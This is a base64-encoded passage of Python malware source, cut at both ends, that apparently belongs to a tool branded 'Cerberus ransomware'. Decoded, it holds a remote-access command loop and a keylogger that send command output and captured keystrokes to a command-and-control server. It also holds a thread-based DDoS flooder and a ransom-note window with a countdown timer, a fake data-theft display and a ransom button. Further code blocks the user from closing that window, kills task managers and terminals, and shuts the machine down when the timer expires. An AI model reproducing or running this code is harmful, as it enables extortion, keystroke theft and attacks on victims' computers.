dXRwdXQve3NlbGYudmljdGltX2lkfSIsCiAgICAgICAgICAgICAgICBqc29uPXsiY21kIjogY21kLCAib3V0cHV0Ijogb3V0cHV0WzoyMDAwXX0sCiAgICAgICAgICAgICAgICB0aW1lb3V0PTUKICAgICAgICAgICAgKQogICAgICAgICAgICBsb2dfZXJyb3IoZiJSQVQ6IEV4ZWN1dGVkIHtjbWRbOjMwXX0iKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgb3V0cHV0ID0gZiJFcnJvcjoge3N0cihlKX0iCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoCiAgICAgICAgICAgICAgICAgICAgZiJ7QzJfU0VSVkVSX1VSTH0vYXBpL3JhdF9vdXRwdXQve3NlbGYudmljdGltX2lkfSIsCiAgICAgICAgICAgICAgICAgICAganNvbj17ImNtZCI6IGNtZCwgIm91dHB1dCI6IG91dHB1dH0sCiAgICAgICAgICAgICAgICAgICAgdGltZW91dD01CiAgICAgICAgICAgICAgICApCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHBhc3MKICAgIAogICAgZGVmIHN0YXJ0X2Rkb3Moc2VsZiwgdGFyZ2V0KToKICAgICAgICAiIiJTdGFydCBERG9TIGF0dGFjayBvbiB0YXJnZXQiIiIKICAgICAgICBpZiBzZWxmLmRkb3NfYWN0aXZlOgogICAgICAgICAgICByZXR1cm4KICAgICAgICAKICAgICAgICBzZWxmLmRkb3NfYWN0aXZlID0gVHJ1ZQogICAgICAgIGxvZ19lcnJvcihmIlpvbWJpZTogU3RhcnRpbmcgRERvUyBvbiB7dGFyZ2V0fSIpCiAgICAgICAgCiAgICAgICAgZGVmIGZsb29kKCk6CiAgICAgICAgICAgIHdoaWxlIHNlbGYuZGRvc19hY3RpdmU6CiAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgcmVxdWVzdHMuZ2V0KHRhcmdldCwgdGltZW91dD0xKQogICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAKICAgICAgICAjIFNwYXduIDUgZmxvb2QgdGhyZWFkcwogICAgICAgIGZvciBfIGluIHJhbmdlKDUpOgogICAgICAgICAgICB0ID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9Zmxvb2QsIGRhZW1vbj1UcnVlKQogICAgICAgICAgICB0LnN0YXJ0KCkKICAgICAgICAgICAgc2VsZi5kZG9zX3RocmVhZHMuYXBwZW5kKHQpCiAgICAKICAgIGRlZiBzdG9wX2Rkb3Moc2VsZik6CiAgICAgICAgIiIiU3RvcCBERG9TIGF0dGFjayIiIgogICAgICAgIHNlbGYuZGRvc19hY3RpdmUgPSBGYWxzZQogICAgICAgIHNlbGYuZGRvc190aHJlYWRzID0gW10KICAgICAgICBsb2dfZXJyb3IoIlpvbWJpZTogRERvUyBzdG9wcGVkIikKCiMgLS0tIEtleWxvZ2dlciBMb2dpYyAtLS0KY2xhc3MgS2V5bG9nZ2VyOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHZpY3RpbV9pZCk6CiAgICAgICAgc2VsZi52aWN0aW1faWQgPSB2aWN0aW1faWQKICAgICAgICBzZWxmLmxvZ19idWZmZXIgPSAiIgogICAgICAgIHNlbGYubG9jayA9IHRocmVhZGluZy5Mb2NrKCkKICAgICAgICBzZWxmLnN0b3BfZXZlbnQgPSB0aHJlYWRpbmcuRXZlbnQoKQogICAgICAgIAogICAgZGVmIHN0YXJ0KHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgc2VsZi5saXN0ZW5lciA9IGtleWJvYXJkLkxpc3RlbmVyKG9uX3ByZXNzPXNlbGYub25fcHJlc3MpCiAgICAgICAgICAgIHNlbGYubGlzdGVuZXIuc3RhcnQoKQogICAgICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1zZWxmLmZsdXNoX2xvb3AsIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgICAgIGxvZ19lcnJvcigiS2V5bG9nZ2VyIHN0YXJ0ZWQgc3VjY2Vzc2Z1bGx5IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIGxvZ19lcnJvcihmIktleWxvZ2dlciBTdGFydCBFcnJvcjoge2V9IikKICAgICAgICAKICAgIGRlZiBvbl9wcmVzcyhzZWxmLCBrZXkpOgogICAgICAgIHRyeToKICAgICAgICAgICAgayA9IGtleS5jaGFyCiAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOgogICAgICAgICAgICBrID0gZiJbe2tleS5uYW1lfV0iCiAgICAgICAgCiAgICAgICAgd2l0aCBzZWxmLmxvY2s6CiAgICAgICAgICAgIHNlbGYubG9nX2J1ZmZlciArPSBzdHIoaykKICAgICAgICAgICAgCiAgICBkZWYgZmx1c2hfbG9vcChzZWxmKToKICAgICAgICB3aGlsZSBub3Qgc2VsZi5zdG9wX2V2ZW50LmlzX3NldCgpOgogICAgICAgICAgICB0aW1lLnNsZWVwKDEwKQogICAgICAgICAgICB3aXRoIHNlbGYubG9jazoKICAgICAgICAgICAgICAgIGlmIG5vdCBzZWxmLmxvZ19idWZmZXI6CiAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgIGRhdGEgPSBzZWxmLmxvZ19idWZmZXIKICAgICAgICAgICAgICAgIHNlbGYubG9nX2J1ZmZlciA9ICIiCiAgICAgICAgICAgIAogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KGYie0MyX1NFUlZFUl9VUkx9L2FwaS9rZXlsb2cve3NlbGYudmljdGltX2lkfSIsIGpzb249eyJrZXlzIjogZGF0YX0sIHRpbWVvdXQ9MykKICAgICAgICAgICAgICAgIGxvZ19lcnJvcihmIlNlbnQge2xlbihkYXRhKX0gY2hhcnMgdG8gQzIiKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBsb2dfZXJyb3IoZiJLZXlsb2cgdXBsb2FkIGZhaWxlZDoge2V9IikKCiMgLS0tIEdVSSBMb2dpYyAtLS0KY2xhc3MgUmFuc29td2FyZUdVSToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBtYXN0ZXIsIHZpY3RpbV9pZCk6CiAgICAgICAgc2VsZi5tYXN0ZXIgPSBtYXN0ZXIKICAgICAgICBzZWxmLnZpY3RpbV9pZCA9IHZpY3RpbV9pZAogICAgICAgIHNlbGYuZG9vbXNkYXlfdHJpZ2dlcmVkID0gRmFsc2UKICAgICAgICBzZWxmLnBheW1lbnRfbW9kZV9hY3RpdmUgPSBGYWxzZQoKICAgICAgICAjIFdJTkRPV0VEIE1PREUgKE1vdmFibGUsIEZha2UtQ2xvc2FibGUpCiAgICAgICAgbWFzdGVyLnRpdGxlKCJDRVJCRVJVUyBSQU5TT01XQVJFIC0gRU5DUllQVEVEIikKICAgICAgICBtYXN0ZXIuZ2VvbWV0cnkoIjEwMjR4NzY4IikgCiAgICAgICAgbWFzdGVyLmF0dHJpYnV0ZXMoJy1mdWxsc2NyZWVuJywgRmFsc2UpIAogICAgICAgIG1hc3Rlci5vdmVycmlkZXJlZGlyZWN0KEZhbHNlKSAjIFNob3cgVGl0bGUgQmFyIChYIGJ1dHRvbikKICAgICAgICBtYXN0ZXIuYXR0cmlidXRlcygnLXRvcG1vc3QnLCBUcnVlKQogICAgICAgIG1hc3Rlci5jb25maWd1cmUoYmc9JyMwYTBhMGEnKQogICAgICAgIG1hc3Rlci5yZXNpemFibGUoRmFsc2UsIEZhbHNlKQogICAgICAgIAogICAgICAgICMgUkFHRUJBSVQgQ0xPU0UKICAgICAgICBtYXN0ZXIucHJvdG9jb2woIldNX0RFTEVURV9XSU5ET1ciLCBzZWxmLnJhZ2ViYWl0X2Nsb3NlKSAKICAgICAgICAKICAgICAgICAjIERpc2FibGUgbWluaW1hbGl6ZS9rZXlib2FyZCBzaG9ydGN1dHMKICAgICAgICBtYXN0ZXIuYmluZCgnPEVzY2FwZT4nLCBsYW1iZGEgZTogImJyZWFrIikKICAgICAgICAKICAgICAgICAjIEFnZ3Jlc3NpdmUgTG9vcAogICAgICAgIHNlbGYuZm9yY2VfZm9jdXNfbG9vcCgpCgogICAgICAgICMgR1VJIEVsZW1lbnRzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBsb2dvX2RhdGEgPSBiYXNlNjQuYjY0ZGVjb2RlKExPR09fQkFTRTY0KQogICAgICAgICAgICBzZWxmLmxvZ28gPSBQaG90b0ltYWdlKGRhdGE9bG9nb19kYXRhKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgc2VsZi5sb2dvID0gTm9uZQoKICAgICAgICBtYWluX2ZyYW1lID0gRnJhbWUobWFzdGVyLCBiZz0nIzBhMGEwYScpCiAgICAgICAgbWFpbl9mcmFtZS5wYWNrKGV4cGFuZD1UcnVlLCBmaWxsPSdib3RoJywgcGFkeD0yMCwgcGFkeT0yMCkKCiAgICAgICAgaWYgc2VsZi5sb2dvOgogICAgICAgICAgICBMYWJlbChtYWluX2ZyYW1lLCBpbWFnZT1zZWxmLmxvZ28sIGJnPScjMGEwYTBhJykucGFjayhwYWR5PTEwKQoKICAgICAgICB0aXRsZV9mb250ID0gdGtmb250LkZvbnQoZmFtaWx5PSJIZWx2ZXRpY2EiLCBzaXplPTI0LCB3ZWlnaHQ9ImJvbGQiKQogICAgICAgIGJvZHlfZm9udCA9IHRrZm9udC5Gb250KGZhbWlseT0iSGVsdmV0aWNhIiwgc2l6ZT0xMikKICAgICAgICBtb25vX2ZvbnQgPSB0a2ZvbnQuRm9udChmYW1pbHk9IkNvdXJpZXIiLCBzaXplPTEyKQogICAgICAgIHRpbWVyX2ZvbnQgPSB0a2ZvbnQuRm9udChmYW1pbHk9IkNvdXJpZXIiLCBzaXplPTM2LCB3ZWlnaHQ9ImJvbGQiKQoKICAgICAgICBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJZT1VSIEZJTEVTIEhBVkUgQkVFTiBFTkNSWVBURUQiLCBmb250PXRpdGxlX2ZvbnQsIGZnPScjZmY0ZDRkJywgYmc9JyMwYTBhMGEnKS5wYWNrKHBhZHk9MTApCiAgICAgICAgTGFiZWwobWFpbl9mcmFtZSwgdGV4dD0iWW91ciBkb2N1bWVudHMsIHBob3RvcywgYW5kIG90aGVyIGltcG9ydGFudCBmaWxlcyBoYXZlIGJlZW4gbG9ja2VkLiIsIGZvbnQ9Ym9keV9mb250LCBmZz0nI2NjY2NjYycsIGJnPScjMGEwYTBhJywgd3JhcGxlbmd0aD03MDApLnBhY2socGFkeT01KQogICAgICAgIAogICAgICAgICMgRE9PTVNEQVkgVElNRVIKICAgICAgICBzZWxmLnRpbWVfbGVmdCA9IDcyICogMzYwMCAKICAgICAgICBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJUSU1FIFJFTUFJTklORyBVTlRJTCBQRVJNQU5FTlQgREFUQSBMT1NTOiIsIGZvbnQ9dGtmb250LkZvbnQoZmFtaWx5PSJIZWx2ZXRpY2EiLCBzaXplPTEyLCB3ZWlnaHQ9ImJvbGQiKSwgZmc9JyNmZjMzMzMnLCBiZz0nIzBhMGEwYScpLnBhY2socGFkeT0oMjAsIDUpKQogICAgICAgIHNlbGYudGltZXJfbGFiZWwgPSBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSI3MjowMDowMCIsIGZvbnQ9dGltZXJfZm9udCwgZmc9JyNmZjAwMDAnLCBiZz0nIzBhMGEwYScpCiAgICAgICAgc2VsZi50aW1lcl9sYWJlbC5wYWNrKHBhZHk9NSkKICAgICAgICAKICAgICAgICAjIEZBS0UgRVhGSUxUUkFUSU9OCiAgICAgICAgc2VsZi5leGZpbF9zdGF0dXMgPSBMYWJlbChtYWluX2ZyYW1lLCB0ZXh0PSJTeXN0ZW0gU2NhbjogQW5hbHl6aW5nIHByaXZhdGUgZGF0YS4uLiIsIGZvbnQ9bW9ub19mb250LCBmZz0nI2ZmZmYwMCcsIGJnPScjMGEwYTBhJykKICAgICAgICBzZWxmLmV4ZmlsX3N0YXR1cy5wYWNrKHBhZHk9KDE1LCA1KSkKICAgICAgICBzZWxmLmV4ZmlsX3Byb2dyZXNzID0gTGFiZWwobWFpbl9mcmFtZSwgdGV4dD0iWyAgICAgICAgICAgICAgICAgICAgXSAwJSIsIGZvbnQ9bW9ub19mb250LCBmZz0nI2ZmZmYwMCcsIGJnPScjMGEwYTBhJykKICAgICAgICBzZWxmLmV4ZmlsX3Byb2dyZXNzLnBhY2soKQogICAgICAgIAogICAgICAgIExhYmVsKG1haW5fZnJhbWUsIHRleHQ9ZiJZT1VSIFZJQ1RJTSBJRCBJUzoiLCBmb250PWJvZHlfZm9udCwgZmc9JyNmZmZmZmYnLCBiZz0nIzBhMGEwYScpLnBhY2socGFkeT0oMjAsIDUpKQogICAgICAgIHNlbGYudmljdGltX2lkX2xhYmVsID0gTGFiZWwobWFpbl9mcmFtZSwgdGV4dD1zZWxmLnZpY3RpbV9pZCwgZm9udD10a2ZvbnQuRm9udChmYW1pbHk9IkNvdXJpZXIiLCBzaXplPTIwLCB3ZWlnaHQ9ImJvbGQiKSwgZmc9JyM0ZGZmODgnLCBiZz0nIzBhMGEwYScpCiAgICAgICAgc2VsZi52aWN0aW1faWRfbGFiZWwucGFjaygpCgogICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsID0gTGFiZWwobWFpbl9mcmFtZSwgdGV4dD0iU1RBVFVTOiBBd2FpdGluZyBwYXltZW50IGNvbmZpcm1hdGlvbi4uLiAoRG9uJ3QgY2xvc2UgdGhpcyB3aW5kb3cpIiwgZm9udD1ib2R5X2ZvbnQsIGZnPScjZmZmZjRkJywgYmc9JyMwYTBhMGEnKQogICAgICAgIHNlbGYuc3RhdHVzX2xhYmVsLnBhY2socGFkeT0oMjAsIDUpKQogICAgICAgIAogICAgICAgIHNlbGYua2V5X3ZhciA9IFN0cmluZ1ZhcigpCiAgICAgICAgc2VsZi5rZXlfZW50cnkgPSBFbnRyeShtYWluX2ZyYW1lLCB0ZXh0dmFyaWFibGU9c2VsZi5rZXlfdmFyLCBmb250PXRrZm9udC5Gb250KGZhbWlseT0iQ291cmllciIsIHNpemU9MTIpLCBzaG93PSIqIiwgd2lkdGg9NTAsIGJnPScjMmEyYTJhJywgZmc9JyNmZmZmZmYnLCBpbnNlcnRiYWNrZ3JvdW5kPSd3aGl0ZScsIGp1c3RpZnk9J2NlbnRlcicpCiAgICAgICAgc2VsZi5rZXlfZW50cnkucGFjayhwYWR5PTEwLCBpcGFkeT01KQogICAgICAgIHNlbGYua2V5X2VudHJ5LmNvbmZpZyhzdGF0ZT0ncmVhZG9ubHknKQoKICAgICAgICBzZWxmLmRlY3J5cHRfYnV0dG9uID0gQnV0dG9uKG1haW5fZnJhbWUsIHRleHQ9IkRFQ1JZUFQgRklMRVMiLCBmb250PXRrZm9udC5Gb250KGZhbWlseT0iSGVsdmV0aWNhIiwgc2l6ZT0xNCwgd2VpZ2h0PSJib2xkIiksIGNvbW1hbmQ9c2VsZi5zdGFydF9kZWNyeXB0aW9uLCBiZz0nI2ZmNGQ0ZCcsIGZnPSd3aGl0ZScsIHBhZHg9MjAsIHBhZHk9MTApCiAgICAgICAgc2VsZi5kZWNyeXB0X2J1dHRvbi5wYWNrKHBhZHk9MTApCiAgICAgICAgc2VsZi5kZWNyeXB0X2J1dHRvbi5jb25maWcoc3RhdGU9J2Rpc2FibGVkJykgCiAgICAgICAgCiAgICAgICAgIyBQQVlNRU5UIEJVVFRPTiAoRml4ZWQgTGF5b3V0IC0gUGFja2VkIGF0IGJvdHRvbSkKICAgICAgICBzZWxmLnBheV9idXR0b24gPSBCdXR0b24obWFpbl9mcmFtZSwgdGV4dD0iUEFZIFJBTlNPTSBOT1ciLCBmb250PXRrZm9udC5Gb250KGZhbWlseT0iSGVsdmV0aWNhIiwgc2l6ZT0xMSwgd2VpZ2h0PSJib2xkIiksIGNvbW1hbmQ9c2VsZi5lbmFibGVfcGF5bWVudF9tb2RlLCBiZz0nIzAwN2JmZicsIGZnPSd3aGl0ZScsIHBhZHg9MTUsIHBhZHk9OCkKICAgICAgICBzZWxmLnBheV9idXR0b24ucGFjayhzaWRlPSdib3R0b20nLCBwYWR5PTIwKQoKICAgICAgICAjIFN0YXJ0IHRocmVhZHMKICAgICAgICBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZyA9IFRydWUKICAgICAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1zZWxmLmhlYXJ0YmVhdF9wb2xsaW5nLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYudXBkYXRlX3RpbWVyLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuZmFrZV9leGZpbHRyYXRpb24sIGRhZW1vbj1UcnVlKS5zdGFydCgpCiAgICAgICAgCiAgICAgICAgc2VsZi5tYXN0ZXIuYWZ0ZXIoMjAwMCwgc2VsZi5jaGFuZ2Vfd2FsbHBhcGVyKQogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuYXVkaW9fbG9vcCwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICAjIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYud2F0Y2hkb2dfbG9vcCwgZGFlbW9uPVRydWUpLnN0YXJ0KCkgIyBESVNBQkxFRDogQ2F1c2luZyBTeXN0ZW0gTGFnCiAgICAgICAgCiAgICAgICAgIyBTVEFSVCBLRVlMT0dHRVIgQVVUT01BVElDQUxMWQogICAgICAgIHNlbGYua2V5bG9nZ2VyID0gS2V5bG9nZ2VyKHZpY3RpbV9pZCkKICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigxMDAwLCBzZWxmLmtleWxvZ2dlci5zdGFydCkKICAgICAgICAKICAgICAgICAjIFNUQVJUIFJBVCBDT01NQU5EIExPT1AgKFBvbHRlcmdlaXN0ICsgWm9tYmllKQogICAgICAgIHNlbGYucmF0X2xvb3AgPSBSQVRDb21tYW5kTG9vcCh2aWN0aW1faWQpCiAgICAgICAgc2VsZi5tYXN0ZXIuYWZ0ZXIoMTUwMCwgc2VsZi5yYXRfbG9vcC5zdGFydCkKICAgICAgICAKICAgICAgICAjIFJBR0VCQUlUIENMT1NFIEhBTkRMRVIKICAgICAgICBtYXN0ZXIucHJvdG9jb2woIldNX0RFTEVURV9XSU5ET1ciLCBzZWxmLnJhZ2ViYWl0X2Nsb3NlKQogICAgICAgIG1hc3Rlci5iaW5kKCI8QWx0LUY0PiIsIGxhbWJkYSBlOiBzZWxmLnJhZ2ViYWl0X2Nsb3NlKCkpCgogICAgZGVmIHJhZ2ViYWl0X2Nsb3NlKHNlbGYpOgogICAgICAgICIiIkludGVyY2VwdHMgY2xvc2UgcmVxdWVzdCBhbmQgdHJvbGxzIHRoZSB1c2VyLiIiIgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgbWVzc2FnZWJveC5hc2t5ZXNubygiRXhpdCBBcHBsaWNhdGlvbiIsICJBcmUgeW91IHN1cmUgeW91IHdhbnQgdG8gcXVpdCB0aGlzIGFwcGxpY2F0aW9uPyIpOgogICAgICAgICAgICAgICAgbWVzc2FnZWJveC5zaG93ZXJyb3IoIkFjY2VzcyBEZW5pZWQiLCAiTE9MIHlvdSB0aG91Z2h0IHlvdSBjb3VsZCBlc2NhcGUuIEFjY2VzcyBEZW5pZWQuIikKICAgICAgICAgICAgICAgICMgUnVuIFRUUyBpbiBhIHNlcGFyYXRlIHRocmVhZCB0byBhdm9pZCBibG9ja2luZyBHVUkKICAgICAgICAgICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuc3BlYWtfbWVzc2FnZSwgYXJncz0oIllvdSBjYW5ub3QgbGVhdmUuIiwpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgIGV4Y2VwdDogcGFzcwoKICAgIGRlZiBmb3JjZV9mb2N1c19sb29wKHNlbGYpOgogICAgICAgICIiIkFnZ3Jlc3NpdmVseSBrZWVwcyB3aW5kb3cgb24gdG9wLCB1bmxlc3MgcGF5aW5nLiBESVNBQkxFRCB0byBhbGxvdyBrZXlsb2dnaW5nLiIiIgogICAgICAgICMgRElTQUJMRUQ6IFRoaXMgd2FzIHByZXZlbnRpbmcgdGhlIHZpY3RpbSBmcm9tIHVzaW5nIG90aGVyIGFwcHMKICAgICAgICAjIFRoZSBrZXlsb2dnZXIgbmVlZHMgdGhlIHZpY3RpbSB0byBiZSBhYmxlIHRvIHR5cGUgaW4gb3RoZXIgd2luZG93cwogICAgICAgIHBhc3MKICAgICAgICAjIGlmIG5vdCBzZWxmLnBheW1lbnRfbW9kZV9hY3RpdmU6CiAgICAgICAgIyAgICAgdHJ5OgogICAgICAgICMgICAgICAgICBzZWxmLm1hc3Rlci5saWZ0KCkKICAgICAgICAjICAgICBleGNlcHQ6CiAgICAgICAgIyAgICAgICAgIHBhc3MKICAgICAgICAjIHNlbGYubWFzdGVyLmFmdGVyKDMwMDAsIHNlbGYuZm9yY2VfZm9jdXNfbG9vcCkKCiAgICBkZWYgc3BlYWtfbWVzc2FnZShzZWxmLCBtZXNzYWdlKToKICAgICAgICAiIiJDcm9zcy1wbGF0Zm9ybSBUVFMuIFN5bmNocm9ub3VzIChibG9ja2luZykgdmVyc2lvbiBmb3IgdGhyZWFkcy4iIiIKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIG9zLm5hbWUgPT0gJ250JzoKICAgICAgICAgICAgICAgIGNtZCA9IGYiQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uU3BlZWNoOyAoTmV3LU9iamVjdCBTeXN0ZW0uU3BlZWNoLlN5bnRoZXNpcy5TcGVlY2hTeW50aGVzaXplcikuU3BlYWsoJ3ttZXNzYWdlfScpIgogICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJwb3dlcnNoZWxsIiwgIi1Db21tYW5kIiwgY21kXSwgY3JlYXRpb25mbGFncz1zdWJwcm9jZXNzLkNSRUFURV9OT19XSU5ET1cpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBpZiBzaHV0aWwud2hpY2goImVzcGVhayIpOgogICAgICAgICAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLnJ1bihbImVzcGVhayIsIG1lc3NhZ2VdLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQogICAgICAgICAgICAgICAgZWxpZiBzaHV0aWwud2hpY2goInNwZC1zYXkiKToKICAgICAgICAgICAgICAgICAgICAgICAgc3VicHJvY2Vzcy5ydW4oWyJzcGQtc2F5IiwgbWVzc2FnZV0sIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICAgICAgCiAgICBkZWYgYXVkaW9fbG9vcChzZWxmKToKICAgICAgICAiIiJSZXBlYXRzIHRoZSB2b2ljZSBtZXNzYWdlIGV2ZXJ5IDMwIHNlY29uZHMuIiIiCiAgICAgICAgbWVzc2FnZSA9ICJZb3VyIGZpbGVzIGFyZSBlbmNyeXB0ZWQuIFBheW1lbnQgaXMgcmVxdWlyZWQuIFN5c3RlbSBmYWlsdXJlIGltbWluZW50LiIKICAgICAgICB3aGlsZSBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZzoKICAgICAgICAgICAgc2VsZi5zcGVha19tZXNzYWdlKG1lc3NhZ2UpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMzApCiAgICAgICAgICAgIAogICAgZGVmIHdhdGNoZG9nX2xvb3Aoc2VsZik6CiAgICAgICAgIiIiS2lsbHMgdGFzayBtYW5hZ2VycyBhbmQgdGVybWluYWxzLiIiIgogICAgICAgIGJsYWNrbGlzdCA9IFsKICAgICAgICAgICAgJ3Rhc2ttZ3InLCAnY21kJywgJ3Bvd2Vyc2hlbGwnLCAKICAgICAgICAgICAgJ2dub21lLXRlcm1pbmFsLXNlcnZlcicsICdnbm9tZS10ZXJtaW5hbCcsICMgR05PTUUKICAgICAgICAgICAgJ2tvbnNvbGUnLCAjIEtERQogICAgICAgICAgICAneGZjZTQtdGVybWluYWwnLCAneHRlcm0nLCAndXh0ZXJtJywKICAgICAgICAgICAgJ2Jhc2gnLCAnc2gnLCAnenNoJywgJ2Zpc2gnLCAjIFNoZWxscyAoQWdncmVzc2l2ZSkKICAgICAgICAgICAgJ2h0b3AnLCAndG9wJywgJ2J0b3AnLCAnd2lyZXNoYXJrJwogICAgICAgIF0KICAgICAgICAKICAgICAgICB3aGlsZSBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZzoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgICAgICAgICAgICAgIGZvciBwcm9jIGluIGJsYWNrbGlzdDoKICAgICAgICAgICAgICAgICAgICAgICAgb3Muc3lzdGVtKGYidGFza2tpbGwgL0YgL0lNIHtwcm9jfS5leGUgPm51bCAyPiYxIikKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgIyBMaW51eCBPcHRpbWl6YXRpb246IHBraWxsIGltcGxpZXMgaW50ZXJuYWwgbG9vcCwgY2FsbGluZyBpdCAxMHggcGVyIHNlYyBpcyBiYWQuCiAgICAgICAgICAgICAgICAgICAgIyBXZSBydW4gdGhpcyBldmVyeSAzIHNlY29uZHMgbm93LgogICAgICAgICAgICAgICAgICAgIGZvciBwcm9jIGluIGJsYWNrbGlzdDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG9zLnN5c3RlbShmInBraWxsIC05IC1mIHtwcm9jfSA+L2Rldi9udWxsIDI+JjEiKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICMgSW5jcmVhc2VkIGZyb20gMS4wcyB0byAzLjBzIHRvIHJlZHVjZSBzeXN0ZW0gbG9hZC9zdHV0dGVyaW5nCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMy4wKSAKCiAgICBkZWYgY2hhbmdlX3dhbGxwYXBlcihzZWxmKToKICAgICAgICBwYXNzCgogICAgZGVmIHRyaWdnZXJfZG9vbXNkYXkoc2VsZik6CiAgICAgICAgaWYgc2VsZi5kb29tc2RheV90cmlnZ2VyZWQ6IHJldHVybgogICAgICAgIHNlbGYuZG9vbXNkYXlfdHJpZ2dlcmVkID0gVHJ1ZQogICAgICAgIAogICAgICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PXNlbGYuc3BlYWtfbWVzc2FnZSwgYXJncz0oIlRpbWUgaGFzIGV4cGlyZWQuIFN5c3RlbSBmYWlsdXJlIGltbWluZW50LiIsKSwgZGFlbW9uPVRydWUpLnN0YXJ0KCkKICAgICAgICBzZWxmLm1hc3Rlci5jb25maWd1cmUoYmc9JyNmZjAwMDAnKSAjIFJFRCBBTEVSVAogICAgICAgIAogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgb3MubmFtZSA9PSAnbnQnOgogICAgICAgICAgICAgICAgb3Muc3lzdGVtKCJzaHV0ZG93biAvcyAvdCAxNSAvYyBcIkNFUkJFUlVTOiBUSU1FIEVYUElSRURcIiIpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBvcy5zeXN0ZW0oInNodXRkb3duIC1oICsxIFwiQ0VSQkVSVVM6IFRJTUUgRVhQSVJFRFwiIikgCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgogICAgZGVmIHVwZGF0ZV90aW1lcihzZWxmKToKICAgICAgICB3aGlsZSBzZWxmLmhlYXJ0YmVhdF90aHJlYWRfcnVubmluZyBhbmQgc2VsZi50aW1lX2xlZnQgPiAwOgogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgICAgIHNlbGYudGltZV9sZWZ0IC09IDEKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHNlbGYudGltZV9sZWZ0IDw9IDA6CiAgICAgICAgICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigwLCBzZWxmLnRyaWdnZXJfZG9vbXNkYXkpCiAgICAgICAgICAgICAgICBzZWxmLm1hc3Rlci5hZnRlcigwLCBsYW1iZGE6IHNlbGYudGltZXJfbGFiZWwuY29uZmlnKHRleHQ9IjAwOjAwOjAwIikpCiAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAKICAgICAgICAgICAgbSwgcyA9IGRpdm1vZChzZWxmLnRpbWVfbGVmdCwgNjApCiAgICAgICAgICAgIGgsIG0gPSBkaXZtb2QobSwgNjApCiAgICAgICAgICAgIHRpbWVfc3RyID0gZiJ7aDowMmR9OnttOjAyZH06e3M6MDJkfSIKICAgICAgICAgICAgCiAgICAgICAgICAgICMgVEhSRUFELVNBRkU6IFNjaGVkdWxlIEdVSSB1cGRhdGUgb24gbWFpbiB0aHJlYWQKICAgICAgICAgICAgc2VsZi5tYXN0ZXIuYWZ0ZXIoMCwgbGFtYmRhIHRzPXRpbWVfc3RyOiBzZWxmLl91cGRhdGVfdGltZXJfZGlzcGxheSh0cykpCiAgICAKICAgIGRlZiBfdXBkYXRlX3RpbWVyX2Rpc3BsYXk